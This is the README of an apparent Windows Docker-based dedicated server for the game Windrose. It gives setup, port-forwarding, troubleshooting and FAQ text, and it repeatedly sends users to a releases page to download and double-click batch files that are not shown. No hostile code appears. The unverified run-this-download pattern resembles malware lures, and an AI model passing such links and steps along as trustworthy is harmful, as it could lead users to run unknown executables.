# ⚓ Windrose-Game-Dedicated-Server - Host your own private pirate adventures

[Download Windrose Server](https://github.com/vivietough2602/Windrose-Game-Dedicated-Server/releases)

## 📦 About this project

Windrose-Game-Dedicated-Server provides a stable way to host your own Windrose game session. This software uses container technology to run the game server on your Windows machine. It handles the updates and system requirements through SteamCMD and Wine. You gain full control over your world settings, player count, and save files.

## ⚙️ System requirements

Your computer needs specific components to run this server well. Ensure your machine meets these standards before you begin:

*   Operating System: Windows 10 or Windows 11 (64-bit).
*   Processor: Intel Core i5 or AMD Ryzen 5 with at least 3.0 GHz speed.
*   Memory: 8 GB of RAM minimum, 16 GB recommended for high player counts.
*   Storage: 20 GB of free space on a Solid State Drive.
*   Network: A stable internet connection with upload speeds of 5 Mbps or higher.
*   Software: Docker Desktop for Windows must be installed and running.

## 🚀 How to set up your server

Follow these steps to get your server running. 

1.  ### Prepare your computer
    Download and install Docker Desktop from the official website. Restart your computer after the installation finishes. Open Docker Desktop and wait for the green status light.

2.  ### Download the software
    Visit the release page to get the latest files. Use the link below to find the correct version.

    [Download Server Files](https://github.com/vivietough2602/Windrose-Game-Dedicated-Server/releases)

    Save the folder to a location you can find easily, such as your desktop or a dedicated games folder. Extract the contents if the file comes in a compressed format.

3.  ### Configure your settings
    Open the folder you downloaded. Look for the configuration file named config.txt. Open this file with Notepad. You can change your server name, set a password, and adjust player slots here. Save the file after you make your changes.

4.  ### Start the server
    Locate the file named start.bat inside the folder. Double-click this file to launch the server. A black command window will appear. This window shows the progress of the server startup. Keep this window open while you play.

## 🛠️ Managing your server

You have total control over the server environment. Use the commands below to keep your game running smoothly.

*   **Updates:** To update the server, stop the running window and run the update.bat file. It checks for new game versions automatically.
*   **Backups:** The server saves your progress every hour. Look in the save folder to find your world data files. Copy these files to a different drive to keep your progress safe.
*   **Port Forwarding:** If you want friends outside your home to join, you must configure your router. Open port 7777 for TCP and UDP traffic. Check your router manual to learn how to open these ports.

## 💡 Troubleshooting common issues

If the server does not start, check these items.

*   **Docker status:** Ensure the Docker Desktop icon is active in your system tray. The server cannot start without Docker.
*   **Firewall settings:** Windows Firewall might block the server. Allow the Windrose application through your firewall settings if you cannot see your server in the game list.
*   **Port conflicts:** Only one server application can use a specific port at one time. Close other game servers before you launch this one.
*   **Memory usage:** If the server crashes, close background applications like web browsers or other games to free up RAM.

## 📋 Features

*   **Automated Updates:** The system checks Steam for new versions every time you start the server.
*   **Stability:** Containers isolate the server from your main Windows files. This prevents system crashes.
*   **Performance:** The setup optimizes the server to use your hardware resources efficiently.
*   **Persistence:** Your player progress stays on the disk even after you shut down the machine.
*   **Private Hosting:** You choose who joins your session. Set a password to restrict access to your server.

## 🌐 Connecting to the game

Once the server confirms it is ready in the command window, launch Windrose on your computer. Navigate to the multiplayer menu. Click on the direct connect tab. Type 127.0.0.1 in the address box. Click connect to enter your world. If you want others to join, provide them with your public IP address. You can find this address by searching for "what is my IP" in a search engine.

## ⚖️ License information

This software uses standard open-source licensing. You can modify the scripts to suit your needs. Do not sell this software or claim ownership of the code. Refer to the license file in the repository for specific legal details.

## ❓ Frequently asked questions

**Does this software cost money to run?**
No, this software is free. You only pay for your own internet and hardware costs.

**Can I run the server on my laptop?**
You can, but keep the laptop plugged into a power outlet. High performance causes the battery to drain quickly. Avoid running the server on a laptop that tends to overheat.

**Will my world delete if I turn off my computer?**
No, the files stay on your hard drive. The world remains exactly as you left it.

**Is it safe to host a server?**
Hosting a server opens a port on your network. Only share your IP address with people you trust. Using a password protects your server from unknown players.

**How do I delete the server?**
To remove the server, stop the running process, delete the folder from your computer, and remove the container image using the Docker Desktop dashboard.